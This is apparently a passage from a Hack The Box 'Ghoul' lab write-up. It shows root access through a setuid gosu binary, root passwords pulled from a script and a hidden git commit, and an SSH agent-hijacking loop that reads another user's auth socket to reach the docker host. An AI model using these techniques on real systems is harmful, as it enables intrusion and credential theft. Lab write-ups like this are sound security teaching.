+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">3713ea5e4353:/$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/sbin/gosu 
+<span class="go">-rws--x--x    1 root     root       1286720 May 24  2017 /usr/sbin/gosu
+</span></code></pre></div></div>
+<p>Just running it, it clearly looks like a binary to run things as other users:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">3713ea5e4353:/$ </span>gosu
+<span class="go">Usage: gosu user-spec command [args]
+   ie: gosu tianon bash
+       gosu nobody:root bash -c 'whoami &amp;&amp; id'
+       gosu 1000:1 id
+
+gosu version: 1.10 (go1.7.1 on linux/amd64; gc)
+     license: GPL-3 (full text at https://github.com/tianon/gosu)
+</span></code></pre></div></div>
+<p>I’ll give one of their examples a spin:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">3713ea5e4353:/$ </span>gosu nobody:root bash <span class="nt">-c</span> <span class="s1">'whoami &amp;&amp; id'</span>
+<span class="go">nobody
+uid=65534(nobody) gid=0(root)
+</span></code></pre></div></div>
+<p>I can run that to get a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">3713ea5e4353:/$ </span>gosu root:root bash
+<span class="gp">3713ea5e4353:/# </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root)
+</span></code></pre></div></div>
+<p>Note - that won’t work unless I have a full tty. I could initiate another reverser shell without a tty.</p>
+<h2 id="privesc-kaneki_pub--root">Privesc: kaneki_pub –&gt; root</h2>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>Now that I’m root on gogs, I have access to files that will help me get to root on kaneki-pc. In <code class="language-plaintext highlighter-rouge">/root/</code>, I see two files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">3713ea5e4353:~# </span><span class="nb">ls</span>
+<span class="go">aogiri-app.7z  session.sh
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">session.sh</code> gives additional login credentials for kaneki to gogs:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3713ea5e4353:~# <span class="nb">cat </span>session.sh 
+<span class="c">#!/bin/bash</span>
+<span class="k">while </span><span class="nb">true
+</span><span class="k">do
+  </span><span class="nb">sleep </span>300
+  <span class="nb">rm</span> <span class="nt">-rf</span> /data/gogs/data/sessions
+  <span class="nb">sleep </span>2
+  curl <span class="nt">-d</span> <span class="s1">'user_name=kaneki&amp;password=12345ILoveTouka!!!'</span> http://172.18.0.2:3000/user/login
+<span class="k">done</span>
+</code></pre></div></div>
+<p>I can’t open <code class="language-plaintext highlighter-rouge">aogiri-app.7z</code> on this computer as <code class="language-plaintext highlighter-rouge">7z</code> isn’t installed. I’ll exfil it using nc to send it to my kali box.</p>
+<h3 id="archive-analysis">Archive Analysis</h3>
+<p>First I’ll use <code class="language-plaintext highlighter-rouge">7z</code> to extract the archive:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>7z x aogiri-app.7z 
+<span class="go">
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,3 CPUs Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz (906EA),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 117507 bytes (115 KiB)
+
+Extracting archive: aogiri-app.7z
+--
+Path = aogiri-app.7z
+Type = 7z
+Physical Size = 117507
+Headers Size = 4011
+Method = LZMA2:192k
+Solid = +
+Blocks = 1
+
+Everything is Ok                                                           
+
+Folders: 114
+Files: 125
+Size:       154976
+Compressed: 117507
+</span></code></pre></div></div>
+<p>The results are the source for a chat app, and it’s a git repo (as there’s a <code class="language-plaintext highlighter-rouge">.git</code> directory):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">ls</span> <span class="nt">-la</span> aogiri-chatapp/
+<span class="go">total 41
+drwxrwx--- 1 root vboxsf 4096 Dec 29  2018 .
+drwxrwx--- 1 root vboxsf 8192 Sep 14 11:11 ..
+drwxrwx--- 1 root vboxsf 4096 Dec 29  2018 .git
+-rwxrwx--- 1 root vboxsf  268 Dec 29  2018 .gitignore
+drwxrwx--- 1 root vboxsf    0 Dec 29  2018 .mvn
+-rwxrwx--- 1 root vboxsf 9113 Dec 29  2018 mvnw
+-rwxrwx--- 1 root vboxsf 5810 Dec 29  2018 mvnw.cmd
+-rwxrwx--- 1 root vboxsf 2111 Dec 29  2018 pom.xml
+-rwxrwx--- 1 root vboxsf  124 Dec 29  2018 README.md
+drwxrwx--- 1 root vboxsf    0 Dec 29  2018 src
+</span></code></pre></div></div>
+<h3 id="aogiri-chatapp-git">aogiri-chatapp git</h3>
+<p>The first thing I did was look at the various branches and commits. master is the only branch, and there’s a handful of commits:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>git branch 
+<span class="go">* master
+
+</span><span class="gp">root@kali# </span>git log <span class="nt">--oneline</span> 
+<span class="go">647c5f1 (HEAD -&gt; master, origin/master) changed service
+b43757d added mysql deps
+b3752e0 noro stop doing stupid shit
+813e0a5 hello world!
+ed5a88c mysql support
+51d2c36 added readme
+bec96aa updated dependencies
+8b74520 update readme
+</span></code></pre></div></div>
+<p>I checked out each of them, looking for anything interesting, but came out relatively empty. I found a set of creds in <code class="language-plaintext highlighter-rouge">src/main/resources/application.properties</code>, but they didn’t work anywhere I could find.</p>
+<p>I then noticed in the <code class="language-plaintext highlighter-rouge">.git</code> folder there’s an <code class="language-plaintext highlighter-rouge">ORIG_HEAD</code>, and it points to a commit that wasn’t in the log above:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">ls</span> .git/
+<span class="go">branches  COMMIT_EDITMSG  config  description  FETCH_HEAD  HEAD  hooks  index  info  logs  objects  ORIG_HEAD  refs
+</span><span class="gp">root@kali# </span><span class="nb">cat</span> .git/ORIG_HEAD 
+<span class="go">0d426b533d4f1877f8a114620be8a1294f34ab71
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">git</code> will make a <a href="https://stackoverflow.com/questions/17595524/orig-head-fetch-head-merge-head-etc?lq=1">special commit</a> before drastic changes are made to a repo. This commit happens behind the scenes, and it wouldn’t make sense to show it to the user. But still, it’s in the repo.</p>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">git show</code> on this commit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>git show ORIG_HEAD
+<span class="go">commit 0d426b533d4f1877f8a114620be8a1294f34ab71
+Author: kaneki &lt;kaneki@aogiri.htb&gt;
+Date:   Sat Dec 29 11:44:50 2018 +0530
+
+    update dependencies
+
+diff --git a/pom.xml b/pom.xml
+index 92f24ee..fc1d313 100644
+</span><span class="diff-removed">--- a/pom.xml
+</span><span class="diff-added">+++ b/pom.xml
+</span><span class="diff-lines">@@ -48,6 +48,11 @@
+</span><span class="go">                        &lt;artifactId&gt;javax.json&lt;/artifactId&gt;
+                        &lt;version&gt;1.0&lt;/version&gt;
+                &lt;/dependency&gt;
+</span><span class="diff-added">+               &lt;dependency&gt;
++                       &lt;groupId&gt;mysql&lt;/groupId&gt;
++                       &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
++                       &lt;version&gt;5.1.46&lt;/version&gt;
++               &lt;/dependency&gt;
+</span><span class="go"> 
+        &lt;/dependencies&gt;
+ 
+diff --git a/src/main/resources/application.properties b/src/main/resources/application.properties
+index 4cbc10b..41adeb0 100644
+</span><span class="diff-removed">--- a/src/main/resources/application.properties
+</span><span class="diff-added">+++ b/src/main/resources/application.properties
+</span><span class="diff-lines">@@ -1,7 +1,7 @@
+</span><span class="go"> server.port=8080
+ spring.datasource.url=jdbc:mysql://localhost:3306/db
+</span><span class="diff-removed">-spring.datasource.username=kaneki
+-spring.datasource.password=7^Grc%C\7xEQ?tb4
+</span><span class="diff-added">+spring.datasource.username=root
++spring.datasource.password=g_xEN$ZuWD7hJf2G
+</span><span class="go"> server.address=0.0.0.0
+ 
+ spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5InnoDBDialect
+</span></code></pre></div></div>
+<p>I can see those same creds changed in this backup, with a password of “7^Grc%C\7xEQ?tb4”.</p>
+<h3 id="su">su</h3>
+<p>The password ‘7^Grc%C\7xEQ?tb4’ works as root password on kaneki-pc:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">kaneki_pub@kaneki-pc:/tmp$ </span>su -
+<span class="go">Password:
+root@kaneki-pc:~#
+</span></code></pre></div></div>
+<p>And there’s a troll root.txt:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kaneki-pc:~# </span><span class="nb">cat </span>root.txt 
+<span class="go">You've done well to come upto here human. But what you seek doesn't lie here. The journey isn't over yet.....
+</span></code></pre></div></div>
+<h2 id="pivot-to-docker-host">Pivot to docker host</h2>
+<h3 id="enumeration-3">Enumeration</h3>
+<p>I’ll upload <a href="https://github.com/DominicBreuker/pspy">pspy</a> to kaneki-pc and watch for processes, and every 6 minutes I get some activity:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2019/05/28 08:00:01 CMD: UID=0    PID=2172   | sshd: [accepted]  
+2019/05/28 08:00:01 CMD: UID=0    PID=2173   | sshd: [accepted]     
+2019/05/28 08:00:01 CMD: UID=0    PID=2174   | sshd: kaneki_adm [priv]
+2019/05/28 08:00:01 CMD: UID=1001 PID=2175   | bash -c ssh root@172.18.0.1 -p 2222 -t ./log.sh 
+</code></pre></div></div>
+<p>That last line doesn’t show up every time, but i caught it sometimes, and it tips where to go next. I can try myself. User 1001 is kaneki_adm. I’ll <code class="language-plaintext highlighter-rouge">su</code>  from root to that user, and try to ssh:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kaneki-pc:/home/kaneki_pub# </span>su kaneki_adm
+<span class="gp">kaneki_adm@kaneki-pc:/home/kaneki_pub$ </span>ssh root@172.18.0.1 <span class="nt">-p</span> 2222
+<span class="gp">kaneki_adm@kaneki-pc:/home/kaneki_pub$ </span><span class="w">
+</span></code></pre></div></div>
+<p>It didn’t work.</p>
+<h3 id="ssh-agent-hijacking">SSH Agent Hijacking</h3>
+<p>Imaging a situation where I want to ssh into box A, but my host can’t talk to A. I need to go through an intermediary, box B. But I don’t want to leave my private keys on B, for whatever reason. SSH Agent Forwarding is set up to address this problem. It allows for keeping access to the private key over a socket so I can authenticate to A.</p>
+<p><a href="https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/">SSH Agent Hijacking</a> is exploiting SSH Agent Forwarding to ride that authentication.</p>
+<p>If I watch right around the time the ssh connection comes in, I’ll see a file is created in <code class="language-plaintext highlighter-rouge">/tmp</code> (<code class="language-plaintext highlighter-rouge">&lt;--</code> added by me):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kaneki-pc:/home/kaneki_pub# </span>find /tmp/
+<span class="go">/tmp/
+/tmp/ssh-FWSgs7xBNwzU
+/tmp/ssh-oomPLQAtpL
+/tmp/ssh-oomPLQAtpL/agent.646  &lt;-- this
+/tmp/ssh-1Oo5P5JuouKm
+/tmp/sshd-stderr---supervisor-ICnHxt.log
+/tmp/sshd-stdout---supervisor-93vAhz.log
+/tmp/ssh-jDhFSu7EeAnz
+</span></code></pre></div></div>
+<p>That <code class="language-plaintext highlighter-rouge">agent.646</code> file is the socket for authentication. To perform a hijack, I need to set the environment variable <code class="language-plaintext highlighter-rouge">SSH_SOCK_AUTH</code> to that <code class="language-plaintext highlighter-rouge">agent</code> file, and then just ssh without a password. But the folder and number will change on each connection, and it doesn’t stay live for very long at all.</p>
+<p>I can pull this off manually if I’m fast, waiting for just the turn of the minute, then get the <code class="language-plaintext highlighter-rouge">agent</code> file from kaneki_adm’s environment variables. Then I set the environment variable for myself, and ssh in. I managed to do it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kaneki-pc:~#</span><span class="w"> </span><span class="nv">pid</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-u</span> kaneki_adm | <span class="nb">grep </span>ssh<span class="nv">$ </span>| <span class="nb">tr</span> <span class="nt">-s</span> <span class="s1">' '</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f2</span><span class="si">)</span> su kaneki_adm <span class="nt">-c</span> <span class="s1">'cat /proc/${pid}/environ'</span> | <span class="nb">sed</span> <span class="s1">'s/\x0/\n/g'</span> | <span class="nb">grep </span>SSH_AUTH_SOCK
+<span class="go">SSH_AUTH_SOCK=/tmp/ssh-KQVJ5LsSKq/agent.11773
+
+</span><span class="gp">root@kaneki-pc:~#</span><span class="w"> </span><span class="nv">SSH_AUTH_SOCK</span><span class="o">=</span>/tmp/ssh-KQVJ5LsSKq/agent.11773 ssh root@172.18.0.1 <span class="nt">-p</span> 2222
+<span class="go">Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-45-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+155 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Tue May 28 07:00:01 2019 from 172.18.0.200
+</span><span class="gp">root@Aogiri:~#</span><span class="w">
+</span></code></pre></div></div>
+<p>But more fun is to create a <code class="language-plaintext highlighter-rouge">bash</code> one-liner that watches for the connection and connects when it’s time:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kaneki-pc:/tmp# </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do</span>
+<span class="gp">&gt;</span><span class="w">  </span><span class="nb">export </span><span class="nv">pid</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-u</span> kaneki_adm | <span class="nb">grep </span>ssh<span class="nv">$ </span>| <span class="nb">tr</span> <span class="nt">-s</span> <span class="s1">' '</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span>
+<span class="gp">&gt;</span><span class="w">  </span><span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="nv">$pid</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+<span class="gp">&gt;</span><span class="w">    </span><span class="nb">echo</span> <span class="s2">"[+] Found pid for kaneki_adm ssh process: </span><span class="nv">$pid</span><span class="s2">"</span><span class="p">;</span>
+<span class="gp">&gt;</span><span class="w">    </span><span class="nb">export </span><span class="nv">SSH_AUTH_SOCK</span><span class="o">=</span><span class="si">$(</span>su kaneki_adm <span class="nt">-c</span> <span class="s1">'cat /proc/${pid}/environ'</span> | <span class="nb">sed</span> <span class="s1">'s/\x0/\n/g'</span> | <span class="nb">grep </span>SSH_AUTH_SOCK | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'='</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span>
+<span class="gp">&gt;</span><span class="w">    </span><span class="nb">echo</span> <span class="s2">"[+] Found ssh auth socket: </span><span class="nv">$SSH_AUTH_SOCKET</span><span class="s2">"</span><span class="p">;</span>
+<span class="gp">&gt;</span><span class="w">    </span><span class="nb">echo</span> <span class="s2">"[*] sshing to target"</span><span class="p">;</span>
+<span class="gp">&gt;</span><span class="w">    </span>ssh root@172.18.0.1 <span class="nt">-p</span> 2222<span class="p">;</span>
+<span class="gp">&gt;</span><span class="w">    </span><span class="nb">break</span><span class="p">;</span>
+<span class="gp">&gt;</span><span class="w">  </span><span class="k">fi</span><span class="p">;</span>
+<span class="gp">&gt;</span><span class="w">  </span><span class="nb">sleep </span>5<span class="p">;</span>
+<span class="gp">&gt;</span><span class="w"> </span><span class="k">done</span>                                                                                                                                                                                        
+<span class="go">[+] Found pid for kaneki_adm ssh process: 20652
+[+] Found ssh auth socket: /tmp/ssh-p5macmIvgg/agent.20329
+[*] sshing to target
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-45-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+155 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Tue May 28 22:24:01 2019 from 172.18.0.200
+</span><span class="gp">root@Aogiri:~# </span><span class="w">
+</span></code></pre></div></div>
+<p>Either way, I can now finally grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:~# </span><span class="nb">cat </span>root.txt 
+<span class="go">7c0f1104...
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="ssh-host-access">SSH Host Access</h3>
+<p>I wanted to see if I could SSH directly into the main host now that I have root access on it (obviously I could write my own key, but that wouldn’t survive reset). I went to <code class="language-plaintext highlighter-rouge">/root/.ssh/</code>. There was a key pair:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:~/.ssh# </span><span class="nb">ls</span>
+<span class="go">authorized_keys  id_rsa  id_rsa.pub
+</span></code></pre></div></div>
+<p>Unfortunately, the public key does not match what’s in <code class="language-plaintext highlighter-rouge">authorized_keys</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:~/.ssh# </span><span class="nb">cat </span>authorized_keys 
+<span class="go">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHK2z6kSC35XV0eoYEcPkwYfvK+IQSnj1pvOUdW89fpFcfOi+o0oDanK7/Oz35E+LazH2bPKcvsMgU8m/FcnrinEWj5Myuguid4+9qlWat8+rZBBjqJybOa56xJJEkjVL9ngxS6CZbVWQ1GyGHcg06MHhdcAk7JQ6WpYaZ/UrZdMPKLqELYWkfp68icV5B2Gz8OGvIisGTL+KtcVL717inreXLp2oifn+RFPefFMX5EhAVxss3AOkUSR0ZsA7t8zOguUMRg4hVqKDFa+Ot0j9E4Ohb48KIOjhglpoYndIbXrq+wsTmdJgDFZczPHn7MkDOl3TvHvC4t9VADS06/90J kaneki@ubuntu
+</span><span class="gp">root@Aogiri:~/.ssh# </span><span class="nb">cat </span>id_rsa.pub 
+<span class="go">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2cf/aa5KbsomuyTYM9fteUwycArS71DKpXXbrha6KciqD4ZKxKM3cvI71h/Thig5ukvQdUsm1eRKYXgMNkdD/GObATiKQANLwpVAUVmJSi0MvDBzG4f7jLg4fZcIqY3gQCMNP6r/bIs5SlXvrqQ54OdzGAOxqIUzFW7MbFoGyv4SYflhZ5HVF65ylUNvUl3XQOkOk18UQE6O4mtjTeFZlD04hsz6JBtEnsZM39OIMxkX2DeR7/2PSz7bCcwhqteGqeF9RnBDhh86un7tcjgJw8olC4vtPlMCUyxftDNMG2uWRmPIY9ngR4jttVd01pivlrxP4DtZi5n5RvW3RLmBD root@ubuntu
+</span></code></pre></div></div>
+<p>I can see the key in <code class="language-plaintext highlighter-rouge">authorized_keys</code> belongs to kaneki@ubuntu, and the root key is also generated on a host named ubuntu.</p>
+<p>There’s a user named kaneki on this box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:~/.ssh# </span><span class="nb">ls</span> /home/
+<span class="go">kaneki
+</span></code></pre></div></div>
+<p>And his public key matches:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:~/.ssh# </span>diff <span class="nt">-s</span> authorized_keys /home/kaneki/.ssh/id_rsa.pub 
+<span class="go">Files authorized_keys and /home/kaneki/.ssh/id_rsa.pub are identical
+</span></code></pre></div></div>
+<p>I can grab the private key from the same directory, and ssh in from kali using port 2222:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ssh <span class="nt">-i</span> ~/id_rsa_ghoul_root <span class="nt">-p</span> 2222 root@10.10.10.101
+<span class="go">Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-45-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+155 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat Sep 14 09:06:41 2019 from 172.18.0.200
+</span><span class="gp">root@Aogiri:~# </span><span class="w">
+</span></code></pre></div></div>
+<h3 id="ssh-cron">SSH Cron</h3>
+<p>With access to the host, I can look at what’s going on that’s causing the ssh forwarding that I hijack. I don’t see any crons for the root user, but there is one for kaneki:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:~# </span>crontab <span class="nt">-l</span> 
+<span class="go">no crontab for root
+</span><span class="gp">root@Aogiri:~# </span>su kaneki
+<span class="gp">kaneki@Aogiri:/root$ </span>crontab <span class="nt">-l</span>
+<span class="go">...[snip]...
+</span><span class="c"># m h  dom mon dow   command
+</span><span class="go">*/6 * * * *     ~/login.sh
+</span></code></pre></div></div>
+<p>I’ll checkout <code class="language-plaintext highlighter-rouge">login.sh</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">kaneki@Aogiri:/$ </span><span class="nb">cat</span> ~/login.sh 
+<span class="c">#!/bin/bash
+</span><span class="go">ssh-agent -s | head -n 1 &gt; /home/kaneki/agent.cf
+source /home/kaneki/agent.cf
+ssh-add
+ssh-add -l
+ssh -tt -A kaneki_adm@172.20.0.150  ssh root@172.18.0.1 -p 2222 -t './log.sh'  
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">ssh-agent -s</code> produces environment variables to start a ssh forwarding session. I can run it to see the output:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">kaneki@Aogiri:~$ </span>ssh-agent <span class="nt">-s</span>
+<span class="go">SSH_AUTH_SOCK=/tmp/ssh-qxuVoJZKp08u/agent.9540; export SSH_AUTH_SOCK;
+SSH_AGENT_PID=9541; export SSH_AGENT_PID;
+echo Agent pid 9541;
+</span></code></pre></div></div>
+<p>In this case, it takes the first line (<code class="language-plaintext highlighter-rouge">head -1</code>), and saves it under <code class="language-plaintext highlighter-rouge">/home/kaneki/agent.cf</code>. Then it sources that file to load the vars into the current process.</p>
+<p>Next it calls <code class="language-plaintext highlighter-rouge">ssh-add</code>, which, according to the <a href="http://manpages.ubuntu.com/manpages/precise/en/man1/ssh-add.1.html">man page</a>, will add local keys to the authentication agent:</p>
+<blockquote>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>When run without arguments, it adds the files ~/.ssh/id_rsa, ~/.ssh/id_dsa, ~/.ssh/id_ecdsa and ~/.ssh/identity.
+</code></pre></div> </div>
+</blockquote>
+<p>Next it runs <code class="language-plaintext highlighter-rouge">ssh-add</code> again with the <code class="language-plaintext highlighter-rouge">-l</code> option to list the keys in the current session, which is likely a remnant of debugging.</p>
+<p>Then it runs a monster ssh command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-tt</span> <span class="nt">-A</span> kaneki_adm@172.20.0.150  ssh root@172.18.0.1 <span class="nt">-p</span> 2222 <span class="nt">-t</span> <span class="s1">'./log.sh'</span>
+</code></pre></div></div>
+<p>This breaks down into two parts:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-tt</span> <span class="nt">-A</span> kaneki_adm@172.20.0.150 <span class="o">[</span><span class="nb">command</span><span class="o">]</span>
+</code></pre></div></div>
+<p>The script will ssh into 172.20.0.150 as kaneki_adm. <code class="language-plaintext highlighter-rouge">-tt</code> means to force a tty allocation, even if the ssh has no local tty. <code class="language-plaintext highlighter-rouge">-A</code> enables forwarding of authentication agent connection.</p>
+<p><code class="language-plaintext highlighter-rouge">[command]</code> is what is run once the ssh connection is established, in this case, by kaneki_adm.</p>
+<p>Now I’ll look at that command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@172.18.0.1 <span class="nt">-p</span> 2222 <span class="nt">-t</span> <span class="s1">'./log.sh'</span>
+</code></pre></div></div>
+<p>It will ssh as root to 172.18.0.1 on port 2222, allocating a tty (<code class="language-plaintext highlighter-rouge">-t</code>), and running <code class="language-plaintext highlighter-rouge">./log.sh</code>.</p>
+<p>This is a bit of a contrived example, as it wouldn’t make sense to use ssh auth forwarding to ssh back into the box you were coming from. But it gets the point here. What’s <code class="language-plaintext highlighter-rouge">log.sh</code>?</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Aogiri:~# </span><span class="nb">cat </span>log.sh 
+<span class="c">#!/bin/bash
+</span><span class="gp"># </span>Added file logger <span class="k">for </span>reports
+<span class="go">sleep 50
+exit
+</span></code></pre></div></div>
+<p>It just sleeps for 50 seconds. ssh will close down as soon as the commands it’s running exit. This gives the socket a chance to stay open so I can exploit it. In the real world, a user would likelt stay connected for a while, meaning the socket would just be there to grab.</p>
+<h3 id="map-of-ghoul">Map of Ghoul</h3>
+<p>Since Ghoul was complex, I thought it might be useful to see a network map:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/ghoul-networkmap.png"><img alt="Ghoul Network Map" src="https://0xdfimages.gitlab.io/img/ghoul-networkmap.png"/><em>Click for full size image</em></a></p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2019/10/05/htb-ghoul.html"></a>
+</article>
